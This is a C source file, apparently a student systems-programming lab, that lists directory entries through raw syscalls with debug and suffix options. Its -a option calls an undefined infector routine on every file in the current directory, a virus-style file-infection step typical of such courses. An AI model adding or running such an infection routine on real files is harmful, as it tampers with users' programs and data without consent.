#include "util.h"
#define SYS_OPEN 5
#define SYS_CLOSE 6
#define SYS_READ 3
#define SYS_WRITE 4
#define SYS_LSEEK 19
#define STDERR 2
#define STDOUT 1
#define STDIN 0


#define DT_UNKNOWN 0
#define DT_FIFO 1
#define DT_CHR 2
#define DT_DIR 4
#define DT_BLK 6
#define DT_REG 8
#define DT_LNK 10
#define DT_SOCK 12
#define BUF_SIZE 8192

#define SYS_CALL(sysid, arg1, arg2, arg3, debug) wrap_sys(system_call(sysid, arg1, arg2, arg3), sysid, debug)


int wrap_sys (int res, int sys_id, int debug){
    
    if(debug == 1){
        char *debug_print = itoa(sys_id);
        system_call(4, 2, "\topcode: ", strlen("\topcode: "));
        system_call(SYS_WRITE, 2, debug_print, strlen(debug_print)); /*print the id*/
        system_call(4, 2, "\tret value: ", strlen("\tret value: "));
        char *debug_print2 = itoa(res);
        system_call(4, 2, debug_print2, strlen(debug_print2));
        system_call(4, 2, "\n", strlen("\n"));

    }
    if(res < 0){
        system_call(4, 2, "EROOR\n", strlen("ERROR\n"));
    }
    return res;
}


struct ent{
    
    int inode;
    int offset;
    unsigned short len;
    char           name[1];
};


int main(int argc, char **argv){
    int bpos,count,i;
    char buf[BUF_SIZE];
    struct ent *d=buf;
    int debug=0;
    int suffix=0;
    
    /*this is 2c
    */
    int asuffix=0;
    
    
    char *hi;
    char *last_char;
    char* in_suffix;
    char d_type;
    int fd=-1;
    fd = system_call(SYS_OPEN,".",0,0777); 
    if(fd<0){ 
        system_call(SYS_WRITE,STDERR,"error",5);
        system_call(SYS_WRITE,STDERR,"\n",1);
        system_call(1,1);
    }

    count= system_call(141, fd, buf, BUF_SIZE);
    
    
    for(i=1; i<argc; i++){
        if(strcmp(argv[i],"-D")==0){
          debug=1;
        }
        else if(strncmp(argv[i],"-p",2)==0){
            suffix=1;
            in_suffix= argv[i]+2;
        }else if(strncmp(argv[i],"-a",2)==0){
            asuffix=1;
            in_suffix= argv[i]+2;
        }
        else{
            system_call(SYS_WRITE,STDERR,"invalid parameter",17);
            system_call(SYS_WRITE,STDERR,"\n",1);
            system_call(1,1);
        }
    }
     
    if (count == -1){
       system_call(SYS_WRITE,STDERR,"error",5);
       system_call(1,1);
    }
    if (count == 0){
          system_call(1,0);
        
    }
    
    for (bpos = 0; bpos < count;) {
        d = ((struct ent *) (buf + bpos));
        d_type = *(buf + bpos + d->len - 1);
        
       
        if(suffix){
            
           last_char= (d->name+(strlen(d->name)-1));
        if(strncmp(last_char,in_suffix, 1) == 0){
             
        if(d_type == DT_REG){
            hi= "regular" ;
        }else if(d_type == DT_DIR){
            hi= "directory";
            
        }else if(d_type == DT_FIFO){
            hi= "FIFO";
        }else if(d_type == DT_SOCK){
            hi="socket";
        }else if(d_type == DT_LNK){
             hi= "symlink";
        }else if(d_type == DT_BLK){
            hi= "block dev";
        }else if(d_type == DT_CHR){
            hi= "char dev";
        }else{
            hi= "???";
        }
        
        SYS_CALL(4, 1, hi, strlen(hi), debug);
        SYS_CALL(4, 1, "\t", strlen("\t"), debug);
        SYS_CALL(4, 1, d->name, strlen(d->name), debug); /*print the name*/
        SYS_CALL(4, 1, "\t", strlen("\t"), debug);
        SYS_CALL(4, 1, itoa(d->len), strlen((itoa(d->len))), debug); /*print the len*/
        SYS_CALL(4, 1, "\n", strlen(" \n"), debug);
        }
       
        
        }else if(asuffix == 1){
                infector(d->name);

                  last_char= (d->name+(strlen(d->name)-1));
        if(strncmp(last_char,in_suffix, 1) == 0){
             
        if(d_type == DT_REG){
            hi= "regular" ;
        }else if(d_type == DT_DIR){
            hi= "directory";
            
        }else if(d_type == DT_FIFO){
            hi= "FIFO";
        }else if(d_type == DT_SOCK){
            hi="socket";
        }else if(d_type == DT_LNK){
             hi= "symlink";
        }else if(d_type == DT_BLK){
            hi= "block dev";
        }else if(d_type == DT_CHR){
            hi= "char dev";
        }else{
            hi= "???";
        }
        
        SYS_CALL(4, 1, hi, strlen(hi), debug);
        SYS_CALL(4, 1, "\t", strlen("\t"), debug);
        SYS_CALL(4, 1, d->name, strlen(d->name), debug); /*print the name*/
        SYS_CALL(4, 1, "\t", strlen("\t"), debug);
        SYS_CALL(4, 1, itoa(d->len), strlen((itoa(d->len))), debug); /*print the len*/
        SYS_CALL(4, 1, "\n", strlen(" \n"), debug);
                }
        }
        else{
             
        SYS_CALL(4, 1, d->name, strlen(d->name), debug); /*print the name*/
        SYS_CALL(4, 1, "\t", strlen("\t"), debug);
        SYS_CALL(4, 1, itoa(d->len), strlen((itoa(d->len))), debug); /*print the len*/
        SYS_CALL(4, 1, "\n", strlen(" \n"), debug);
        
        }
        bpos += d->len;
        
        
    }          



    return 0;
}
